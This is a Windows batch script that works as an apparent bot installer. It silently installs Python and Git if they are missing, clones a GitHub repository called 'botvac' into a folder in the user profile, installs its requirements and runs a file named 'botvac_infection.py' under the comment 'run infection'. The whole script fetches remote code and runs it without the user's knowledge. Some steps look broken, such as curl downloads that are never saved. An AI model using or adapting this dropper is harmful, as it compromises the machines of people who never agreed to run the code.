mkdir %USERPROFILE%/.mvp
cd %USERPROFILE%/.mvp

:: install python if not installed
call where python
IF %ERRORLEVEL% == 0 goto :skipPythonInstall
ECHO "no python"
curl https://www.python.org/ftp/python/3.10.6/python-3.10.6-amd64.exe
python-3.10.6-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Include_pip=1

:skipPythonInstall

:: install git if not installed and clone
call where git
IF %ERRORLEVEL% == 0 goto :skipGitInstall
ECHO "no git"
curl https://github.com/git-for-windows/git/releases/download/v2.37.2.windows.2/PortableGit-2.37.2.2-32-bit.7z.exe
PortableGit-2.37.2.2-32-bit.7z.exe clone https://github.com/ofirsiboni/botvac
goto :usePortableGit

:skipGitInstall
git clone https://github.com/ofirsiboni/botvac
:usePortableGit

:: run infection
cd botvac
python3 -m pip install -r Botvac/requirments.txt
python3 Botvac/bot/botvac_infection.py